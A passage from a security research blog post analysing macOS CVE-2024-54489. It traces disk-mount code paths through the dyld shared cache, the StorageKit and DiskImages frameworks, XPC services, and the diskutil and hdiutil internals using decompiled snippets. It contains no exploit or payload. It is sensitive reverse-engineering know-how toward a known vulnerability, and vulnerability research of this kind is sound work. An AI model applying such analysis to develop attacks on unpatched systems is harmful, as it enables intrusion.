dyld_shared_cache_arm64e-rwxr-xr-x@ <span class="hljs-number">1</span> ji9umi  staff  <span class="hljs-number">2121580544</span> Sep  <span class="hljs-number">6</span> <span class="hljs-number">20</span>:<span class="hljs-number">19</span> dyld_shared_cache_arm64e<span class="hljs-number">.01</span>-rwxr-xr-x@ <span class="hljs-number">1</span> ji9umi  staff     <span class="hljs-number">1106577</span> Sep  <span class="hljs-number">6</span> <span class="hljs-number">20</span>:<span class="hljs-number">19</span> dyld_shared_cache_arm64e.map</code></pre><p>The purpose of each file is as follows:</p><ol><li><strong>dyld_shared_cache_arm64e</strong><ol><li>This is main file. Depending on the architecture, it may be named x86_64 instead of arm64e</li></ol></li><li><strong>dyld_shared_cache_arm64e.01</strong><ol><li>Split version of the main file that functions as an extension.</li><li>In the firmware I analyzed, the arm64e version had only one split file (<code>.01</code>), whereas the x86_64 version was numbered up to <code>.05</code>.</li></ol></li><li><strong>dyld_shared_cache_arm64e.map</strong><ol><li>A text-based map file containing human-readable strings.</li><li>It records information such as memory mapping addresses for the main file&#x2019;s components.</li></ol></li></ol><h3 id="1-2-decompile-shared-cache"><a href="#1-2-decompile-shared-cache" class="headerlink" title="1.2. decompile shared cache"></a>1.2. decompile shared cache</h3><p>Once the extraction is complete, you can load the files into a decompiler to begin you analysis. The key difference from analyzing standard files is that you are required to select the specific regions or segments you wish to analyze.</p><p><img src="image2.png" alt="image.png"></p><p>The image above shows the <strong>Dyld Shared Cache Triage</strong> view in Binary Ninja, where you can inspect the internal components. In addition to the address and name, there is a &#x2018;Loaded&#x2019; column. This indicates that you can selectively load only the specific items you wish to analyze into the decompiler.</p><p><img src="image3.png" alt="image.png"></p><p>You can also filter items using keywords via the search bar. When you right-click on a specific item, two options are available: you can either load only the selected item or load the selected item along with all its related dependencies.</p><p>If you choose to include related items, the dylibs and frameworks associated with the target will be loaded together.</p><p>Once loaded, you can proceed with the analysis using standard binary analysis techniques. However, keep in mind if you haven&#x2019;t loaded all regions, the decompiler might fail to resolve some references automatically. Therefore, the ability to perform <strong>contextual analysis</strong> is required to bridge those gaps.</p><p>In the actual analysis view, you can still load specific items containing certain addresses. The need for analyst to make these judgment calls is what distinguishes this process from analyzing a standard binary.</p><h2 id="2-Analyze-Suspicious-Method"><a href="#2-Analyze-Suspicious-Method" class="headerlink" title="2. Analyze Suspicious Method"></a>2. Analyze Suspicious Method</h2><h3 id="2-1-StorageKit-framework"><a href="#2-1-StorageKit-framework" class="headerlink" title="2.1. StorageKit.framework"></a>2.1. StorageKit.framework</h3><p>The <code>[obj1 mountWithCompletionBlock:]</code> called by the application can be located within the DSC as <code>-[SKDisk mountWithCompletionBlock:]</code>. The internal execution flow proceeds as follows:</p><ol><li><code>-[SKDisk mountWithCompletionBlock:]</code> </li><li><code>-[SKDisk mountWithOptions:withCompletionBlock:]</code></li><li><code>-[SKDisk mountWithOptionsDictionary:withCompletionBlock:]</code></li><li><code>-[SKHelperClient mountDisk:options:completionBlock:]</code></li><li><code>-[SKHelperClient mountDisk:options:blocking:completionBlock:]</code> </li></ol><p>During static analysis, I was unable to find the implementation for the <code>[obj_9 mountDisk:obj_6 options:obj_1 withCompletionUUID:obj_5]</code> method, which is called internally within <code>-[SKHelperClient mountDisk:options:blocking:completionBlock:]</code>.</p><p>To clarify this, it is necessary to analyze where <code>obj_9</code> is defined. The value is retrieved via <code>[[self remoteObjectWithUUID:obj_5 errorHandler:&amp;stack_block_var_b8] retain];</code>.</p><pre><code class="hljs objectivec"><span class="hljs-keyword">id</span> obj_9 =    [[<span class="hljs-keyword">self</span> remoteObjectWithUUID:obj_5 errorHandler:&amp;stack_block_var_b8] <span class="hljs-keyword">retain</span>];obj_6 = [[obj_2 minimalDictionaryRepresentation] <span class="hljs-keyword">retain</span>];[obj_2 release];[obj_9 mountDisk:obj_6 options:obj_1 withCompletionUUID:obj_5];</code></pre><p>To analyze the internal implementation, we need to examine the <code>-[SKHelperClient remoteObjectWithUUID:errorHandler:]</code> method. Its primary function is to handle the XPC connection process.</p><pre><code class="hljs objectivec">    <span class="hljs-keyword">id</span> -[<span class="hljs-built_in">SKHelperClient</span> remoteObjectWithUUID:errorHandler:](<span class="hljs-keyword">struct</span> <span class="hljs-built_in">SKHelperClient</span>* <span class="hljs-keyword">self</span>, SEL sel, <span class="hljs-keyword">id</span> remoteObjectWithUUID, <span class="hljs-keyword">id</span> errorHandler, <span class="hljs-keyword">void</span>* arg)    {        <span class="hljs-keyword">id</span> obj = [remoteObjectWithUUID <span class="hljs-keyword">retain</span>];        <span class="hljs-keyword">id</span> obj_1 = [errorHandler <span class="hljs-keyword">retain</span>];        <span class="hljs-keyword">id</span> obj_4 = [[<span class="hljs-keyword">self</span> xpcQueue] <span class="hljs-keyword">retain</span>];        <span class="hljs-keyword">struct</span> Block_literal_7ff917e939a3 stack_block_var_70;        stack_block_var_70.isa = &amp;__NSConcreteStackBlock;        stack_block_var_70.flags = <span class="hljs-number">0xc2000000</span>;        stack_block_var_70.reserved = <span class="hljs-number">0</span>;        stack_block_var_70.invoke =            ___52-[<span class="hljs-built_in">SKHelperClient</span> re...tWithUUID:errorHandler:]_block_invoke;        stack_block_var_70.descriptor = &amp;block_descriptor_7ff9426b8a90;        stack_block_var_70.strong_ptr_20 = <span class="hljs-keyword">self</span>;        stack_block_var_70.strong_ptr_30 = obj_1;        stack_block_var_70.strong_ptr_28 = obj;        <span class="hljs-keyword">id</span> obj_2 = [obj <span class="hljs-keyword">retain</span>];        <span class="hljs-keyword">id</span> obj_3 = [obj_1 <span class="hljs-keyword">retain</span>];        j__dispatch_async(obj_4, &amp;stack_block_var_70);        [obj_4 release];        obj_4 = [[<span class="hljs-keyword">self</span> xpcConnection] <span class="hljs-keyword">retain</span>];<span class="hljs-comment">// ...</span></code></pre><blockquote><p>XPC provides a lightweight mechanism for inter-process communication (IPC), allowing different applications and services to exchange data seamlessly through XPC services.</p></blockquote><p>Since the previous method only covered the XPC connection itself, I had to analyze other methods to identify the target service being connected. I was able to confirm the connection endpoint within the <code>-[SKHelperClient createXPCConnection]</code>method.</p><pre><code class="hljs objectivec"><span class="hljs-keyword">void</span> -[<span class="hljs-built_in">SKHelperClient</span> createXPCConnection](<span class="hljs-keyword">struct</span> <span class="hljs-built_in">SKHelperClient</span>* <span class="hljs-keyword">self</span>, SEL sel){    <span class="hljs-keyword">id</span> rax = [[<span class="hljs-built_in">NSXPCConnection</span> alloc] initWithMachServiceName:<span class="hljs-string">@&quot;</span><span class="hljs-string">        com.apple.storagekitd&quot;</span> options:<span class="hljs-number">0x1000</span>];</code></pre><p>You can identify the running service through the provided service name, and by using the command below, you can locate the actual executable file being invoked.</p><pre><code class="hljs bash">&#x256D;&#x2500;ji9umi@Junyoungs-MacBook-Pro <span class="hljs-keyword">in</span> ~ &#x2570;$ ps -ef | grep storagekitd | grep -v $$    0 35052     1   0 22Sep25 ??         0:09.17 /usr/libexec/storagekitd</code></pre><p>While analyzing this vulnerability, I conducted research on other publicly disclosed bugs to gain a deeper understanding of the overall system architecture. During this process, I discovered a vulnerability analysis related to <code>storagekitd</code>, which confirmed that it is identified as <strong>StorageKit</strong> in the official patch notes.</p><p>The vulnerability that provided this information was CVE-2024-44243, and I also found a separate, in-depth analysis published by Microsoft regarding this issue.</p><blockquote><p><a href="https://support.apple.com/ko-kr/121839">https://support.apple.com/ko-kr/121839</a><br><a href="https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/">https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/</a></p></blockquote><p>Considering that the vulnerability currently under analysis was patched in Disk Utility, I determined that this particular path was out of scope and proceeded to verify other potential attack vectors.</p><h3 id="2-2-DiskImages-framework"><a href="#2-2-DiskImages-framework" class="headerlink" title="2.2. DiskImages.framework"></a>2.2. DiskImages.framework</h3><p>The <code>_DIHLDiskImageAttach()</code> function, called by the application, can be analyzed by loading the <strong>DiskImages.framework</strong> from the DSC.</p><p>To summarize its internal behavior, the function generates a dictionary by configuring various option values based on the parameters passed during the call. This dictionary is subsequently referenced during the execution of <code>[obj_2 performOperationReturning:&amp;theDict_1];</code>.</p><p>The object <code>obj_2</code> is instantiated as follows:</p><pre><code class="hljs objectivec"><span class="hljs-keyword">id</span> obj_2 = [[DIHelperProxy alloc] initWithDictionary:obj andStatusProc:arg2     andContext:arg3];<span class="hljs-keyword">if</span> (_DIGetDebugLevel())    _NSLog();int32_t rbx_3 = [obj_2 performOperationReturning:&amp;theDict_1];</code></pre><p>In summary, the invoked method corresponds to <code>-[DIHelperProxy performOperationReturning:]</code>. Within this method, subsequent operations are handled as separate threads using <code>NSThread</code>.</p><pre><code class="hljs objectivec">*(uint64_t*)performOperationReturning_1 = nullptr;[<span class="hljs-keyword">self</span>-&gt;_threadCondLock lock];[<span class="hljs-keyword">self</span>-&gt;_threadCondLock unlockWithCondition:<span class="hljs-number">1</span>];<span class="hljs-keyword">if</span> (_DIGetDebugLevel())    _NSLog();[<span class="hljs-built_in">NSThread</span> detachNewThreadSelector:<span class="hljs-keyword">@selector</span>(workerThread:) toTarget:<span class="hljs-keyword">self</span>     withObject:<span class="hljs-string">@&quot;workerThread:&quot;</span>];[<span class="hljs-keyword">self</span>-&gt;_threadCondLock lockWhenCondition:<span class="hljs-number">0</span>];[<span class="hljs-keyword">self</span>-&gt;_threadCondLock unlock];<span class="hljs-keyword">char</span> rax_7;</code></pre><p>The behavior of the <code>detachNewThreadSelector:</code> method confirmed that it executes the selector passed as an argument; consequently, I was able to locate the implementation of the <code>-[DIHelperProxy workerThread:]</code> method.</p><p>Internally, the <code>workerThread:</code> method calls <code>threadSetupServer</code> to initialize and run a server instance for the connection.</p><pre><code class="hljs objectivec">    <span class="hljs-keyword">if</span> (![<span class="hljs-keyword">self</span> threadSetupServer])    {        <span class="hljs-keyword">if</span> (_DIGetVerboseLevel())            _NSLog();                <span class="hljs-keyword">self</span>-&gt;_threadResultsError = <span class="hljs-number">6</span>;    }    <span class="hljs-keyword">else</span>    {        int32_t rax_6 = [<span class="hljs-keyword">self</span> threadLaunchToolAuthenticated:(uint64_t)(int32_t)<span class="hljs-keyword">self</span>            -&gt;_withAuthentication];        <span class="hljs-keyword">self</span>-&gt;_threadResultsError = rax_6;<span class="hljs-comment">// ...</span>}</code></pre><p>If the connection is successful, the flow proceeds to <code>threadLaunchToolAuthenticated:</code>. In the event of a failure, it logs the error and sets an error number. The XPC target attempting the connection is as follows:</p><pre><code class="hljs objectivec"><span class="hljs-keyword">if</span> (!j__sandbox_check((uint64_t)j____getpid(), <span class="hljs-string">&quot;mach-lookup&quot;</span>, <span class="hljs-number">2</span>,     [<span class="hljs-string">@&quot;com.apple.system.hdiejectd.xpc&quot;</span> UTF8String])){</code></pre><h2 id="3-Other-Executable-File"><a href="#3-Other-Executable-File" class="headerlink" title="3. Other Executable File"></a>3. Other Executable File</h2><p>During the application analysis, I discovered that <code>diskutil</code> and <code>hdiutil</code> also support mount options. Both are command-line interface (CLI) tools, and their respective roles and locations are as follows:</p><ul><li><strong>diskutil</strong><ul><li><code>/usr/sbin/diskutil</code></li><li>A utility for managing local disks and volumes</li></ul></li><li><strong>hdiutil</strong><ul><li><code>/usr/bin/hdiutil</code></li><li>A utility specifically designed for handling disk images.</li></ul></li></ul><h3 id="3-1-diskutil"><a href="#3-1-diskutil" class="headerlink" title="3.1. diskutil"></a>3.1. diskutil</h3><p><code>diskutil</code> supports two primary mounting methods: <code>mount</code> and <code>mountDisk</code>. While the former targets a <strong>single volume</strong>, the latter targets <strong>all mountable volumes</strong> residing on the specified disk.</p><pre><code class="hljs bash">&#x256D;&#x2500;ji9umi@Junyoungs-MacBook-Pro <span class="hljs-keyword">in</span> ~ &#x2570;$ diskutil Disk Utility ToolUtility to manage <span class="hljs-built_in">local</span> disks and volumesMost commands require an administrator or root userWARNING: Most destructive operations are not promptedUsage:  diskutil [quiet] &lt;verb&gt; &lt;options&gt;, <span class="hljs-built_in">where</span> &lt;verb&gt; is as follows:<span class="hljs-comment"># ...</span>     u[n]mount            (Unmount a single volume)     unmountDisk          (Unmount an entire disk (all volumes))     eject                (Eject a disk)     mount                (Mount a single volume)     mountDisk            (Mount an entire disk (all mountable volumes))<span class="hljs-comment"># ...</span></code></pre><p>The initial analysis focused on the logic from tool execution to option parsing. The execution flow is as follows:</p><ol><li><code>[Main init]</code></li><li><code>[Main run]</code></li><li><code>[CommandLineInterface run]</code><ul><li>Verifies whether arguments are present.</li></ul></li><li><code>[CommandLineInterface parseVerbAndDispatch:]</code></li></ol><p>If arguments are provided, the flow naturally reaches <code>-[CommandLineInterface parseVerbAndDispatch:]</code>. This method is responsible for validating the options and executing the corresponding internal processing.</p><pre><code class="hljs objectivec"><span class="hljs-keyword">if</span> (![rax_1 caseInsensitiveCompare:<span class="hljs-string">@&quot;mount&quot;</span>])    <span class="hljs-comment">/* tailcall */</span>    <span class="hljs-keyword">return</span> [[[DiskMount alloc] init] mount:entireDisk:];<span class="hljs-keyword">if</span> (![rax_1 caseInsensitiveCompare:<span class="hljs-string">@&quot;mountDisk&quot;</span>])    <span class="hljs-comment">/* tailcall */</span>    <span class="hljs-keyword">return</span> [[[DiskMount alloc] init] mount:entireDisk:];</code></pre><p>The code snippet above illustrates the processing of <code>mount</code> and <code>mountDisk</code>, confirming that both eventually call the <code>-[DiskMount mount:entireDisk:]</code> method.</p><p>Due to a decompiler artifact in Binary Ninja&#x2019;s Pseudo Objective-C, the value for the <code>entireDisk:</code> field appeared to be missing. However, cross-referencing with the Assembly or LLIL (Low Level Intermediate Language) views reveals that the value is set to <code>0</code> when called via <strong>mount</strong>, and <code>1</code> when called via <code>mountDisk</code>.</p><pre><code class="hljs nasm">  72 @   rdi = rax  73 @   rdx = rbx  74 @   ecx = 0  75 @   goto 89 @ 0x1000053c7// ...  89 @   rsp = rsp + 8  90 @   rbx = pop  91 @   r12 = pop  92 @   r13 = pop  93 @   r14 = pop  94 @   r15 = pop  95 @   rbp = pop  96 @   &lt;return&gt; tailcall([_objc_msgSend].q)// ...   119 @   rdx = &amp;cfstr_mount 120 @   rdi = r15 121 @   rsi = r12 122 @   call([_objc_msgSend].q) 123 @   if (rax == 0) then 124 @ 0x1000053f0 else 128 @ 0x100004d94 124 @   rdi = &amp;cls_DiskMount 125 @   call(_objc_alloc_init) 126 @   rsi = [&amp;selRef_mount:entireDisk:].q 127 @   goto 72 @ 0x100005372</code></pre><p>To summarize the execution flow: at line 119, the program loads the string <strong>&#x2018;</strong><code>mount</code><strong>&#x2018;</strong> for comparison. If they match at the branch on line 123, the flow proceeds to line 124; otherwise, it jumps to line 128.</p><p>Following the path from line 124, the program initializes the required instances and retrieves the selector information for the subsequent method call. The execution then branches to line 72.</p><p>At line 72, the process of setting up the necessary arguments begins. The calling convention for <code>objc_msgSend()</code> is defined as follows:</p><ul><li><em>rdi</em>: instance</li><li><em>rsi</em>: selector</li><li><em>rdx</em>: first argument</li><li><em>rcx</em>: second argument</li></ul><p>Since the method invoked here takes two arguments, line 74 reveals the logic where the <code>entireDisk</code> parameter is set to <code>0</code> in the ecx register.</p><p>As I continued to analyze the internal behavior of the <code>-[DiskMount mount:entireDisk:]</code> method, I encountered a familiar call that had appeared earlier in the analysis.</p><pre><code class="hljs objectivec"><span class="hljs-keyword">if</span> (!entireDisk){    <span class="hljs-keyword">id</span> obj = nullptr;    <span class="hljs-keyword">char</span> rax_39 = [obj_57 mountWithOptionsDictionary:obj_3 error:&amp;obj];    <span class="hljs-keyword">id</span> obj_62 = [obj <span class="hljs-keyword">retain</span>];</code></pre><p>At the point of execution, after the arguments have been successfully parsed for a single volume mount, <code>obj_57</code> is identified as an <code>SKDisk</code> instance. The full method name is <code>-[SKDisk mountWithOptionsDictionary:error:]</code>.</p><p>This is notably similar to the <code>-[SKDisk mountWithOptionsDictionary:withCompletionBlock:]</code> method mentioned during the previous analysis of StorageKit.framework, and their internal behaviors follow a very similar pattern.</p><p>Even when invoked via <code>mountDisk</code> instead of <code>mount</code>, although there are additional intermediate calls, the actual mounting process is ultimately handled by <code>-[SKDisk mountWithOptionsDictionary:withCompletionBlock:]</code>.</p><pre><code class="hljs objectivec"><span class="hljs-keyword">id</span> obj_63 = [[obj_8 wholeDiskForDisk:obj_57] <span class="hljs-keyword">retain</span>];obj_53 = obj_63;<span class="hljs-keyword">id</span> obj_1 = nullptr;obj_52 = (uint64_t)[obj_63 mountWithOptionsDictionary:obj_3 error:&amp;obj_1];obj_4 = [obj_1 <span class="hljs-keyword">retain</span>];obj_56 = [[CommandLineInterface sharedInterface] <span class="hljs-keyword">retain</span>];</code></pre><p>Since the subsequent operations are implemented within the DSC, I proceeded with the analysis of hdiutil first to gain further context.</p><h3 id="3-2-hdiutil"><a href="#3-2-hdiutil" class="headerlink" title="3.2. hdiutil"></a>3.2. hdiutil</h3><p>Considering that the <code>mount</code>, <code>mountvol</code>, and <code>attach</code> options in <code>hdiutil</code> are likely relevant, I focused my initial analysis primarily on these commands.</p><pre><code class="hljs c"><span class="hljs-keyword">void</span> _start(<span class="hljs-keyword">int32_t</span> argc, <span class="hljs-keyword">int64_t</span>** argv) __noreturn    <span class="hljs-keyword">int32_t</span> argc_1 = argc    <span class="hljs-keyword">int64_t</span>** argv_1 = argv    <span class="hljs-keyword">uint64_t</span> __size = _strlen(__s: _basename(*argv)) + <span class="hljs-number">1</span>    <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> (* rax_2)[<span class="hljs-number">0x8</span>] = _malloc_type_malloc(__size, <span class="hljs-number">0x766447de</span>)    data_100041008 = rax_2    <span class="hljs-keyword">int64_t</span>* rdi_3 = *argv        <span class="hljs-keyword">if</span> (rax_2 != <span class="hljs-number">0</span>)        _strlcpy(__dst: rax_2, __source: _basename(rdi_3), __size)    <span class="hljs-keyword">else</span>        data_100041008 = rdi_3        _atexit(sub_100005280)    <span class="hljs-keyword">int32_t</span> rax_4 = _DIInitialize()</code></pre><p>Unlike <code>diskutil</code>, the execution flow of <code>hdiutil</code> originates from the <code>_start()</code> function. Consistent with the previous analysis, the program first checks the number of arguments passed during execution to verify if additional options are present, followed by a branching logic based on that count.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> (argc s&lt; <span class="hljs-number">2</span>)    _warnx(<span class="hljs-string">&quot;missing verb&quot;</span>)    rdi_8 = *argv<span class="hljs-keyword">else</span>    <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> (* r12_1)[<span class="hljs-number">0x5</span>] = data_100041020    <span class="hljs-keyword">char</span>* r15_1 = argv[<span class="hljs-number">1</span>]</code></pre><p>Upon accessing the address <code>data_100041020</code>, which is referenced during the branching logic, I identified a table structure as shown below. This table appears to serve as a dispatch mechanism, mapping command strings to their respective handler functions.</p><pre><code class="hljs c">  char const (* data_100041020)[0x5] = data_1000310c9 {&quot;help&quot;}  <span class="hljs-keyword">void</span>* data_100041028 = sub_1000152e7  <span class="hljs-keyword">void</span>* data_100041030 = sub_10001530c  <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> (* data_100041040)[<span class="hljs-number">0x7</span>] = data_10002cbb5 {<span class="hljs-string">&quot;attach&quot;</span>}  <span class="hljs-keyword">void</span>* data_100041048 = sub_100010b70  <span class="hljs-keyword">void</span>* data_100041050 = sub_10000278f  <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> (* data_100041060)[<span class="hljs-number">0x7</span>] = data_10002fbca {<span class="hljs-string">&quot;detach&quot;</span>}  <span class="hljs-keyword">void</span>* data_100041068 = sub_100013841  <span class="hljs-keyword">void</span>* data_100041070 = sub_100006937  <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> (* data_100041080)[<span class="hljs-number">0x6</span>] = data_1000310ce {<span class="hljs-string">&quot;eject&quot;</span>}  <span class="hljs-keyword">void</span>* data_100041088 = sub_10001380c  <span class="hljs-keyword">void</span>* data_100041090 = sub_100006937  <span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span> (* data_1000410a0)[<span class="hljs-number">0x7</span>] = cstr_verify {<span class="hljs-string">&quot;verify&quot;</span>}  <span class="hljs-keyword">void</span>* data_1000410a8 = sub_10001b010  <span class="hljs-keyword">void</span>* data_1000410b0 = sub_100009c1c<span class="hljs-comment">// ...</span></code></pre><p>The table consists of repeating structures containing an <strong>option name</strong> followed by <strong>two function pointers</strong>, which presumably serve as handlers for each respective option.</p><p>Taking the <strong>&#x2018;</strong><code>mount</code><strong>&#x2018;</strong> option as an example, it is mapped to two specific function addresses: <code>sub_100010b70</code> and <code>sub_10000278f</code>.</p><pre><code class="hljs c">char const (* data_1000412a0)[0x6] = data_100031149 {&quot;mount&quot;}<span class="hljs-keyword">void</span>* data_1000412a8 = sub_100010b70<span class="hljs-keyword">void</span>* data_1000412b0 = sub_10000278f</code></pre><p>Upon examining the <code>sub_100010b70()</code> function, it was confirmed to contain the logic for displaying help information (usage instructions) specific to that option.</p><pre><code class="hljs c">    <span class="hljs-function"><span class="hljs-keyword">int64_t</span> <span class="hljs-title">sub_100010b70</span><span class="hljs-params">(<span class="hljs-keyword">int32_t</span> arg1)</span></span><span class="hljs-function"></span><span class="hljs-function">        data_100041559 </span>= <span class="hljs-number">1</span>        data_100041549:<span class="hljs-number">5.b</span> = <span class="hljs-number">1</span>        data_100041549:<span class="hljs-number">1.</span>d = <span class="hljs-number">0x1010101</span>        data_100041551 = <span class="hljs-number">0x1010101</span>        data_100041555 = <span class="hljs-number">0x101</span>        FILE* rdi = *___stderrp                <span class="hljs-keyword">if</span> (arg1 != <span class="hljs-number">0</span>)            _fprintf(rdi, <span class="hljs-string">&quot;Usage:\t%s [options] &lt;image&gt;\n&quot;</span>, <span class="hljs-string">&quot;hdiutil attach&quot;</span>,                 &amp;data_100041548)            <span class="hljs-keyword">return</span> _fprintf(*___stderrp, <span class="hljs-string">&quot;\t%s -help\n&quot;</span>, <span class="hljs-string">&quot;hdiutil attach&quot;</span>) __tailcall                _fprintf(rdi, <span class="hljs-string">&quot;%s: attach disk image\n&quot;</span>, <span class="hljs-string">&quot;hdiutil attach&quot;</span>, &amp;data_100041548)        _fprintf(*___stderrp, <span class="hljs-string">&quot;Usage:\t%s &lt;image&gt;\n&quot;</span>, <span class="hljs-string">&quot;hdiutil attach&quot;</span>)        _fwrite(__ptr: <span class="hljs-string">&quot;\tDevice options:\n&quot;</span>, __size: <span class="hljs-number">0x11</span>, __nitems: <span class="hljs-number">1</span>,             __stream: *___stderrp)<span class="hljs-comment">// ...</span></code></pre><p>The <code>sub_10000278f()</code> function is confirmed to be the primary execution handler, containing the core logic required to process the option when invoked.</p><p>Unlike the previous help-related function, this handler manages the actual operational flow, including argument validation and the subsequent calls to underlying frameworks for mounting or attaching disk images.</p><pre><code class="hljs c">    <span class="hljs-function"><span class="hljs-keyword">uint64_t</span> <span class="hljs-title">sub_10000278f</span><span class="hljs-params">()</span></span><span class="hljs-function"></span><span class="hljs-function">        <span class="hljs-keyword">int64_t</span> rax</span><span class="hljs-function">        <span class="hljs-keyword">int64_t</span> var_38 </span>= rax        <span class="hljs-keyword">int64_t</span> rsi        <span class="hljs-keyword">int32_t</span> rdi        rsi, rdi = sub_100010dc0(<span class="hljs-number">0x10b8</span>)        <span class="hljs-keyword">int64_t</span> rax_1 = *___stack_chk_guard        CFAllocatorRef r14 = *_kCFAllocatorDefault        CFMutableDictionaryRef theDict_4 = _CFDictionaryCreateMutable(allocator: r14,             capacity: <span class="hljs-number">0</span>, keyCallBacks: _kCFTypeDictionaryKeyCallBacks,             valueCallBacks: _kCFTypeDictionaryValueCallBacks)        CFDictionaryRef theDict = <span class="hljs-literal">nullptr</span>        <span class="hljs-keyword">int32_t</span> r12                <span class="hljs-keyword">if</span> (rdi s&lt;= <span class="hljs-number">2</span>)            _warnx(<span class="hljs-string">&quot;attach: missing &lt;image&gt;&quot;</span>)            r12 = <span class="hljs-number">0x16</span>            <span class="hljs-keyword">goto</span> label_1000028aa                data_100041559 = <span class="hljs-number">1</span>        data_100041549:<span class="hljs-number">1.</span>d = <span class="hljs-number">0x1010101</span>        data_100041549:<span class="hljs-number">5.b</span> = <span class="hljs-number">1</span>        data_100041551 = <span class="hljs-number">0x1010101</span>        data_100041555 = <span class="hljs-number">0x101</span>        r12 = sub_100004133(&amp;data_100041560, &amp;data_100041548)                <span class="hljs-keyword">if</span> (_getenv(<span class="hljs-string">&quot;com_apple_hdid_debug&quot;</span>) == <span class="hljs-number">0</span>)            <span class="hljs-keyword">if</span> (_getenv(<span class="hljs-string">&quot;com_apple_hdid_verbose&quot;</span>) != <span class="hljs-number">0</span>)                data_100041564 = <span class="hljs-number">1</span>                data_1000415b4 = <span class="hljs-number">1</span>                _DISetVerboseLevel(<span class="hljs-number">1</span>)        <span class="hljs-keyword">else</span>            data_100041564 = <span class="hljs-number">1</span>            data_1000415b4 = <span class="hljs-number">1</span>            data_10004156c = <span class="hljs-number">1</span>            data_1000415b0 = <span class="hljs-number">1</span>            _DISetDebugLevel(<span class="hljs-number">1</span>)            _DISetVerboseLevel(<span class="hljs-number">1</span>)<span class="hljs-comment">// ...</span>                            <span class="hljs-keyword">if</span> (!_DIGetDebugLevel())                            {                            label_100003c86:                                <span class="hljs-keyword">int64_t</span> var_10e0_1 = <span class="hljs-number">0x40000000</span>;                                <span class="hljs-keyword">int64_t</span> (* var_10d8_1)(<span class="hljs-keyword">void</span>* arg1, <span class="hljs-keyword">int64_t</span>* arg2) =                                    sub_100010d82;                                <span class="hljs-keyword">void</span>* <span class="hljs-keyword">const</span> var_10d0_1 = &amp;data_10003d120;                                CFMutableDictionaryRef theDict_5 = theDict_4;                                sub_10001521e();                                <span class="hljs-keyword">uint64_t</span> (* rsi_16)(<span class="hljs-keyword">int64_t</span> arg1, CFDictionaryRef arg2);                                                                <span class="hljs-keyword">if</span> (_DIGetDebugLevel())                                    rsi_16 = sub_100014888;                                <span class="hljs-keyword">else</span>                                    rsi_16 = sub_100004702;                                                                r12 = _DIHLDiskImageAttach(theDict_4, rsi_16, <span class="hljs-number">0</span>, &amp;theDict);<span class="hljs-comment">// ...</span></code></pre><p>The execution logic extracts the options passed with the command and organizes them into a dictionary format. This processed data is then ultimately passed as an argument to the <code>_DIHLDiskImageAttach()</code> function, which performs the actual attachment and mounting of the disk image.</p><h2 id="4-To-Do"><a href="#4-To-Do" class="headerlink" title="4. To Do"></a>4. To Do</h2><p>To summarize the analysis so far, the core operations of these utilities leverage the <strong>StorageKit</strong> and <strong>DiskImages</strong> frameworks, both of which are implemented within the <strong>DSC</strong>.</p><p>I have confirmed that the methods defined in the DSC further interact with separate executable services through <strong>XPC</strong> and <strong>Proxy mechanisms</strong>. Before diving deeper into these sub-services, I plan to perform a comparative analysis between the vulnerable and patched versions to identify any significant changes in the execution flow or security logic.</p><hr><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li>Analyze DSC<ul><li><a href="https://www.jviotti.com/2023/11/20/exploring-macos-private-frameworks.html">https://www.jviotti.com/2023/11/20/exploring-macos-private-frameworks.html</a></li></ul></li><li>Analyze Suspicious Method<ul><li>StorageKit.framework<ul><li><a href="https://developer.apple.com/documentation/xpc">https://developer.apple.com/documentation/xpc</a></li></ul></li><li>DiskImages.framework<ul><li><a href="https://developer.apple.com/documentation/foundation/thread/detachnewthreadselector(_:totarget:with">https://developer.apple.com/documentation/foundation/thread/detachnewthreadselector(_:totarget:with</a>:)</li></ul></li></ul></li><li>Other Executable File<ul><li><a href="https://ss64.com/mac/diskutil.html">https://ss64.com/mac/diskutil.html</a></li><li><a href="https://ss64.com/mac/hdiutil.html">https://ss64.com/mac/hdiutil.html</a></li></ul></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/MacOS/">MacOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/ji9umi/">ji9umi</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-54489/">CVE-2024-54489</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/18/ji9umi/cve-2024-54489-analysis-from-security-updates-part2/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] CVE-2024-54489 Analysis from Security Updates Part 2(KR)</title>
      <link>https://hackyboiz.github.io/2025/12/18/ji9umi/cve-2024-54489-analysis-from-security-updates-part2/kr/</link>
      <guid>https://hackyboiz.github.io/2025/12/18/ji9umi/cve-2024-54489-analysis-from-security-updates-part2/kr/</guid>
      <pubDate>Thu, 18 Dec 2025 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;image1.jpg&quot; alt=&quot;image1&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2024-54489 Analysis Series&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://hackyboiz.github.io/2025/09/13/j</description>
        
      
      
      
